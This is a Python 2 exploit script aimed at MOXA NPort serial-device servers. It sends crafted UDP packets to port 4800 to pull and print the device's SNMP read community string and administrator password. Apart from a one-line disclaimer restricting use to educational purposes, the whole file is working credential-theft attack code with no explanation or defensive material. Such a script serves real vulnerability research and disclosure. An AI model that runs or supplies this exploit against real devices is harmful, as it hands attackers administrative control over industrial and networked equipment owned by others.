# Retrieve passwords from certain MOXA NPort devices
# This will attempt to retrieve device passwords including:
# - SNMP Read community string
# - Administrator password

# You are authorized to run this script for educational, noncommercial purposes only.

import socket
import hexdump
import binascii
import sys
import struct

# build a MOXA Packet with the given function code and payload
def buildPacket(fc, data):
    # length is the data + header bytes (4 header bytes)
    length = len(data) + 4
    # one byte is the function code, 3 bytes is the length
    packet = struct.pack(">I", length | (fc << 24))
    packet += data
    return packet

def extractString(response, startoffset):
    output = ""
    done = False
    offset = startoffset
    while done == False:
        if response[offset] != "\x00":
            output += response[offset]
        else:
            done = True
        offset += 1
    return output
        

def extractSNMP(configresponse):
    return extractString(configresponse, 0x18)

def extractAdminPassword(passwordresponse):
    print "Debug: hexdump"
    hexdump.hexdump(passwordresponse)
    return extractString(passwordresponse, 200)

def login(sock, server_addr):
    # first, we build a login packet
    packet = buildPacket(1, binascii.unhexlify("00000000"))
    response = sendPacket(packet, sock, server_addr)
    # device identifier is always 00000000+the device identifier (model number and mac address)
    deviceid = binascii.unhexlify("00000000") + response[8:20]
    # subsequent packets get the device id appended
    login = buildPacket(0x16, deviceid)
    response = sendPacket(login, sock, server_addr)
    # ignore the response?
    # now send the auth request packet
    snmpcommunityread = buildPacket(0x28, deviceid + deviceid[6:])
    response = sendPacket(snmpcommunityread, sock, server_addr)
    #    hexdump.hexdump(response)
    print "SNMP read community: ", extractSNMP(response)
    
    passwordread = buildPacket(0x29, deviceid + deviceid[6:])
    response = sendPacket(passwordread, sock, server_addr)
    if len(response) > 200:    
        print "Admin password: ", extractAdminPassword(response)
    else:
        print "Admin password cannot be extracted from this model or firmware version"
    
    return

def sendPacket(data, sock, server_addr, Debug = True):
    print "Sending:"
    hexdump.hexdump(data)
    sent = sock.sendto(data, server_addr)
    data,server = sock.recvfrom(4096)
    print "Received:"
    hexdump.hexdump(data)
    return data


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_addr = (sys.argv[1], 4800)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
login(sock, server_addr)
